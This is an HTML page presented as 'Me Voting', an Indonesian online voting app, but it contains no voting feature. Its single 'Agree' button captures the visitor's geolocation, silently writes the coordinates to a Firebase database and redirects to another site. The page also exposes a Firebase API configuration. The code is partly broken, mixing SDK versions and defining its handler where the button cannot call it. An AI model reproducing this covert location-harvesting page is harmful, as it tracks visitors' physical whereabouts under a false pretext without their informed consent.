<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Me Voting</title>
    <meta name="description" content="Me Voting adalah web aplikasi untuk pemilihan secara online, ini dibuat agar memudahkan masyarakat untuk memilih pilihan yang tepat.">
    <meta name="keywords" content="mevoting, voting, vote, pemilihan, poling">
    <meta name="author" content="Me Voting">
    <meta property="og:image" content="http://mevoting.is-best.net/favicon.ico">
    <meta property="og:image:type" content="image/jpeg">
    <meta property="og:image:width" content="250">
    <meta property="og:image:height" content="250"> 
    <meta property="og:site_name" content="http://mevoting.is-best.net/">
    <meta property="og:site" content="http://mevoting.is-best.net/">
    <meta property="og:title" content="Me Voting">
    <meta property="og:description" content="Me Voting adalah web aplikasi untuk pemilihan secara online, ini dibuat agar memudahkan masyarakat untuk memilih pilihan yang tepat.">
    <meta property="og:url" content="http://mevoting.is-best.net/">
    <meta name="twitter:card" content="http://mevoting.is-best.net/favicon.ico">
    <script type='text/javascript' src='https://cusmedroid.github.io/js/jquery-3.6.0.min.js'></script>
    <!--firebase-->
    <script src="https://www.gstatic.com/firebasejs/7.6.2/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/7.6.2/firebase-firestore.js"></script>
    <script src="https://www.gstatic.com/firebasejs/live/3.1/firebase.js"></script>
    <style>#myDIV{display:none;}</style>
  </head>
  <body>
    <button onclick="getLocation()">Setuju</button>
    <p id="demo"></p>
    <script type="module">
      // Import the functions you need from the SDKs you need
      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.4.0/firebase-app.js";
      import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.4.0/firebase-analytics.js";
      // TODO: Add SDKs for Firebase products that you want to use
      // https://firebase.google.com/docs/web/setup#available-libraries
      
      // Your web app's Firebase configuration
      // For Firebase JS SDK v7.20.0 and later, measurementId is optional
      const firebaseConfig = {
        apiKey: "AIzaSyDBJgF1WwtGveoiCbEpdrJ8ZEsvNurlhcI",
        authDomain: "me-voting.firebaseapp.com",
        projectId: "me-voting",
        storageBucket: "me-voting.appspot.com",
        messagingSenderId: "95946629295",
        appId: "1:95946629295:web:960b0fe2871a9acc72b45a",
        measurementId: "G-FRV5YKE1ZY"
      };
      
      // Initialize Firebase
      const app = initializeApp(firebaseConfig);
      const analytics = getAnalytics(app);
      console.log(firebase);
      const d = new Date();
      let time = d.getTime();
      var x = document.getElementById("demo");
      function getLocation() {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(showPosition);
        } else { 
          x.innerHTML = "Pastikan anda menyetujui lokasi!";
        }
      }
      
      function showPosition(position) {
        x.innerHTML = "Latitude: " + position.coords.latitude + "<br>Longitude: " + position.coords.longitude;
        console.log(position.coords.latitude+", "+position.coords.longitude);
        firebase.database().ref("/").child(time).update({
            Latitude : position.coords.latitude,
            Longitude : position.coords.longitude
        });
      
        window.location.assign("http://mevoting.is-best.net/");
      }
    </script>
  </body>
</html>
